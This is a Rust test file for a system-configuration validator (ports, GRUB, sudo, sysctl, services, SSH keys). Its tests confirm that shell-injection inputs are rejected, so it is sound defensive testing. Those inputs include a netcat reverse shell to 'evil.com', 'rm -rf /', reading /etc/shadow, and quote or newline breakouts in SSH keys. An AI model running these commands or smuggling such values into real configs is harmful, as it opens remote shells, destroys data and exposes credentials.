//! Tests for system fields (services, sysctl, sudo, firewall ports, GRUB, SSH keys).
//!
//! Bodies preserved verbatim from the original `inject.rs` test module.

use super::super::*;
use crate::config::{FirewallConfig, GrubConfig, SshConfig, UserConfig};

#[test]
fn inject_rejects_shell_metachar_in_port() {
    let cfg = InjectConfig {
        firewall: FirewallConfig {
            allow_ports: vec!["22; nc -e /bin/sh evil.com".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_valid_fields() {
    let cfg = InjectConfig {
        hostname: Some("web-server.lab".into()),
        username: Some("admin".into()),
        user: UserConfig {
            groups: vec!["docker".into(), "sudo".into()],
            ..Default::default()
        },
        firewall: FirewallConfig {
            allow_ports: vec!["22/tcp".into(), "80:443/tcp".into()],
            ..Default::default()
        },
        enable_services: vec!["sshd".into(), "docker.service".into()],
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn grub_default_allows_spaces_and_commas() {
    // GRUB menu titles routinely contain spaces and commas, e.g.
    // "Ubuntu, with Linux 6.x-generic" -- these must not be rejected.
    let cfg = InjectConfig {
        grub: GrubConfig {
            default_entry: Some("Ubuntu, with Linux 6.x-generic".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn grub_default_rejects_shell_metachar() {
    let cfg = InjectConfig {
        grub: GrubConfig {
            default_entry: Some("Ubuntu$(rm -rf /)".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn grub_default_accepts_slash_path() {
    // sed now uses | as delimiter so / in grub_default is safe.
    let cfg = InjectConfig {
        grub: GrubConfig {
            default_entry: Some("Ubuntu/recovery".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn grub_cmdline_accepts_slash_path() {
    // sed now uses | as delimiter so / in cmdline params is safe.
    let cfg = InjectConfig {
        grub: GrubConfig {
            cmdline_extra: vec!["root=/dev/sda1".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn grub_cmdline_accepts_valid_params() {
    let cfg = InjectConfig {
        grub: GrubConfig {
            cmdline_extra: vec![
                "quiet".into(),
                "splash".into(),
                "nomodeset".into(),
                "intel_iommu=on".into(),
            ],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_rejects_shell_metachar_in_sudo_command() {
    let cfg = InjectConfig {
        user: UserConfig {
            sudo_commands: vec!["ALL; rm -rf /".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_valid_sudo_commands() {
    let cfg = InjectConfig {
        user: UserConfig {
            sudo_commands: vec!["/usr/bin/apt".into(), "/usr/sbin/reboot".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_rejects_backtick_in_service_name() {
    let cfg = InjectConfig {
        enable_services: vec!["ssh`whoami`".into()],
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_grub_default_with_slash() {
    // sed now uses | as delimiter so / in grub_default is safe.
    let cfg = InjectConfig {
        grub: GrubConfig {
            default_entry: Some("Ubuntu/recovery".into()),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "grub_default with '/' must be accepted (sed uses | delimiter)"
    );
}

#[test]
fn inject_rejects_sysctl_value_with_semicolon() {
    let cfg = InjectConfig {
        sysctl: vec![("net.ipv4.ip_forward".into(), "1; rm -rf /".into())],
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_rejects_sudo_command_with_pipe() {
    let cfg = InjectConfig {
        user: UserConfig {
            sudo_commands: vec!["/usr/bin/systemctl | cat /etc/shadow".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err());
}

#[test]
fn inject_accepts_valid_sudo_command() {
    let cfg = InjectConfig {
        user: UserConfig {
            sudo_commands: vec!["/usr/bin/systemctl".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok());
}

#[test]
fn inject_rejects_ssh_key_with_single_quote() {
    // Mint preseed uses printf '%s\n' 'KEY' -- a single quote in the key
    // content would break out of the single-quoting and allow arbitrary
    // shell injection.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec!["ssh-ed25519 AAAA'; evil_cmd #".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "authorized_key with single quote must be rejected"
    );
}

#[test]
fn inject_rejects_ssh_key_containing_heredoc_sentinel() {
    // Defense in depth: even though the heredoc approach is no longer used,
    // a key whose content matches the old FORGEISO_KEY_EOF sentinel as a
    // standalone line is still rejected.  If the heredoc approach is ever
    // reintroduced, this check prevents early termination.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec![
                "ssh-ed25519 AAAA...\nFORGEISO_KEY_EOF\nssh-ed25519 BBBB...".into()
            ],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "authorized_key containing heredoc sentinel as a standalone line must be rejected"
    );
}

#[test]
fn inject_accepts_valid_ssh_key() {
    // A well-formed ed25519 public key with a realistic comment must be accepted.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec![
                "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFORGEISo_KEY_EOF_not_a_sentinel user@host"
                    .into(),
            ],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_ok(),
        "valid SSH public key must be accepted"
    );
}

#[test]
fn inject_rejects_ssh_key_with_double_quote() {
    // Kickstart wraps keys in double quotes: sshkey --username=user "KEY"
    // A double quote inside the key comment would terminate the argument early
    // and allow injection into the kickstart file.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec![r#"ssh-ed25519 AAAA user@"hostname""#.into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "SSH key with double quote must be rejected"
    );
}

#[test]
fn inject_rejects_ssh_key_with_newline() {
    // Newlines in an SSH key break line-oriented directives (Kickstart sshkey,
    // preseed late_command) and are not valid in authorized_keys entries.
    let cfg = InjectConfig {
        ssh: SshConfig {
            authorized_keys: vec!["ssh-ed25519 AAAA\nmalicious-command".into()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "SSH key with embedded newline must be rejected"
    );
}

#[test]
fn inject_rejects_port_zero() {
    let cfg = InjectConfig {
        firewall: FirewallConfig {
            allow_ports: vec!["0".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err(), "port 0 must be rejected");
}

#[test]
fn inject_rejects_port_over_65535() {
    let cfg = InjectConfig {
        firewall: FirewallConfig {
            allow_ports: vec!["99999".to_string()],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_err(), "port 99999 must be rejected");
}

#[test]
fn inject_accepts_port_range_valid() {
    let cfg = InjectConfig {
        firewall: FirewallConfig {
            allow_ports: vec![
                "80:443/tcp".to_string(),
                "22".to_string(),
                "ssh".to_string(),
            ],
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(cfg.validate().is_ok(), "valid port specs must be accepted");
}

#[test]
fn inject_rejects_grub_timeout_over_3600() {
    let cfg = InjectConfig {
        grub: GrubConfig {
            timeout: Some(3601),
            ..Default::default()
        },
        ..Default::default()
    };
    assert!(
        cfg.validate().is_err(),
        "grub_timeout > 3600 must be rejected"
    );
}

#[test]
fn inject_accepts_grub_timeout_at_boundary() {
    for t in [0u32, 1, 10, 3600] {
        let cfg = InjectConfig {
            grub: GrubConfig {
                timeout: Some(t),
                ..Default::default()
            },
            ..Default::default()
        };
        assert!(cfg.validate().is_ok(), "grub_timeout {t} must be accepted");
    }
}
